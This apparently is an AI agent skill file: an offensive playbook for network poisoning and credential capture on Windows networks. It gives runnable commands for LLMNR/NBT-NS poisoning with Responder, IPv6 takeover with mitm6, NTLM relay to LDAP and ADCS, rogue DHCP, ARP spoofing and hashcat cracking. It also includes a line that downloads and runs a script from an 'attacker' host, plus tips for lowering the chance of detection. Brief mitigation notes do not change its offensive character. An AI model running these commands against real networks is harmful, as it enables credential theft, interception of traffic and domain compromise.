---
name: offensive-network-poisoning
description: "Broadcast resolution poisoning attacks for credential capture — LLMNR / NBT-NS / mDNS poisoning with Responder/Inveigh, IPv6 mitm6 attacks (DHCPv6 takeover, DNS spoofing for WPAD), DHCP exhaustion + rogue DHCP, ARP spoofing (DAI-aware), WPAD discovery abuse, and signal-level evasion (analyze mode, targeted poisoning). Use during assumed-breach engagements to harvest NetNTLMv2 hashes from clients trying to resolve unresolvable hostnames — extremely effective against default Windows configurations."
---

# Network Poisoning (LLMNR / NBT-NS / mDNS / IPv6)

When a Windows client can't resolve a hostname via DNS, it falls back to broadcast protocols — LLMNR, NetBIOS-NS, mDNS. Respond claiming to be the target, capture the NTLM hash. Same idea on IPv6 via DHCPv6 takeover.

## Quick Workflow

1. Run analyze mode first — see what's already broadcast on the wire
2. Switch to active responding once you understand the noise level
3. Capture NetNTLMv2 hashes; crack offline
4. If cracking fails, relay (see `offensive-ntlm-relay`)

---

## LLMNR / NBT-NS / mDNS

### Analyze Mode (Listen, Don't Respond)

```bash
# Responder analyze — pure observation, no responses
sudo responder -I eth0 -A
```

You see:
- Who's broadcasting what (potential targets)
- Existing rogue responders (if any)
- Domain auth patterns (NETLOGON, fileserver name resolution)

This step is invisible. Always run before active poisoning.

### Active Responder

```bash
# Full mode — respond, capture hashes, run rogue WPAD
sudo responder -I eth0 -wrf

# -w  : enable rogue WPAD server (huge for browsers)
# -r  : enable answers for NBT-NS Workstation Service (00 byte)
# -f  : fingerprint hosts that reply
```

Captured hashes log to `/usr/share/responder/logs/Responder-Session.log`. Crack with hashcat:

```bash
hashcat -m 5600 hash_file rockyou.txt -r OneRuleToRuleThemAll.rule
```

### Inveigh (Windows Side)

When you have a Windows foothold, run Inveigh in-memory:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://attacker/Inveigh.ps1')
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTP Y -SMB Y
# Hashes appear in console
```

Inveigh is the Windows-side equivalent of Responder, useful when you can't get a Linux device on the network.

### Targeting Specific Names

Common broadcast queries to look for in analyze mode:

- `WPAD` — every Windows browser asks for this; rogue WPAD = traffic redirect
- `ISATAP` — IPv6 transition; rare modern hits
- `DCC1`, `DC02` — typo/reconnect attempts; sometimes admin scripts
- `\\fileserver-OLD\\share` — legacy hostname references
- `\\printer-name\\` — printer SMB browsing

## IPv6 / mitm6

Most IPv4-only deployments still have IPv6 enabled on Windows clients. Clients periodically request DHCPv6. Reply as the DHCPv6 server, advertise yourself as DNS, win every name lookup.

```bash
# Combined with NTLM relay for full attack chain
sudo mitm6 -d corp.local &
sudo impacket-ntlmrelayx -t ldaps://dc -wh attacker --delegate-access

# Browser → WPAD → resolved by you → 401 → NTLM auth → relayed to LDAP
```

The chain delivers RBCD (Resource-Based Constrained Delegation) on a victim computer or a domain admin grant — far higher impact than a single hash capture.

### Why IPv6 Beats IPv4

- IPv4: only Windows fallback to LLMNR (configurable)
- IPv6: DHCPv6 + DNS chain happens automatically by default
- Deployment-side mitigations (disable LLMNR via GPO) leave IPv6 untouched in many environments

## DHCP Exhaustion + Rogue DHCP

```bash
# Drain legitimate DHCP pool
yersinia -G    # DHCP attack mode → Sending DISCOVER

# Rogue DHCP advertising attacker as gateway/DNS
sudo dnsmasq -d --no-daemon --interface=eth0 --bind-interfaces \
  --dhcp-range=10.0.0.100,10.0.0.200,12h \
  --dhcp-option=3,attacker_ip --dhcp-option=6,attacker_ip
```

New clients get attacker as gateway; attacker MITMs their traffic. Combined with ARP spoofing for existing leases.

## ARP Spoofing

```bash
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 10.0.0.50; arp.spoof on; net.sniff on"
```

DAI (Dynamic ARP Inspection) on managed switches blocks this. Default switches and unmanaged segments are still vulnerable.

## WPAD Detection / Abuse

WPAD (Web Proxy Auto-Discovery) — Windows browsers query for `wpad.<domain>` then `wpad` via DNS, falling back to LLMNR/NBT-NS.

```bash
# Responder enables WPAD with -w; serves a malicious wpad.dat that proxies through attacker
# Browsers receiving wpad.dat send their HTTP/HTTPS through attacker
```

Combined with NTLM relay to LDAP/ADCS:

```bash
sudo responder -I eth0 -wrf &
sudo impacket-ntlmrelayx -t http://ca/certsrv/certfnsh.asp --adcs --template DomainController &
# Browser auths to WPAD → 401 → relayed to ADCS → cert issued
```

## Detection Considerations

| Signal | Defender View |
|---|---|
| Volume of LLMNR responses from one source | WIDS / behavioral analytics |
| mitm6 DHCPv6 advertising | IPv6-aware NIDS |
| ARP table changes | DAI / arpwatch |
| WPAD response anomaly | Browser warning if MIME mismatch |

Mature environments may detect bulk responder activity quickly. Targeted poisoning (specific host requests during specific hours) reduces signal.

## Mitigation Awareness (What Defenders Should Have)

- Disable LLMNR via GPO (`Network/DNS Client/Turn off multicast name resolution`)
- Disable NetBIOS-over-TCP/IP per interface
- Disable IPv6 on management interfaces (or block DHCPv6 + RA via firewall)
- DAI on switches
- WPAD removed from PNL via DNS sinkhole

## Engagement Cheatsheet

```bash
# 1. Analyze first
sudo responder -I eth0 -A   # 5-10 minutes; document broadcast names

# 2. Active responder + rogue WPAD
sudo responder -I eth0 -wrf

# 3. Concurrent IPv6 takeover
sudo mitm6 -d corp.local

# 4. Optional: combined relay
sudo impacket-ntlmrelayx -t ldaps://dc -wh attacker --delegate-access

# 5. Crack captured NetNTLMv2 hashes
hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule

# 6. Document each captured account + IP + timing
```

---

## Key References

- Responder: github.com/lgandx/Responder
- Inveigh: github.com/Kevin-Robertson/Inveigh
- mitm6: github.com/dirkjanm/mitm6
- "From Responder to NT AUTHORITY\SYSTEM" (multiple BB writeups)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/network-poisoning.md
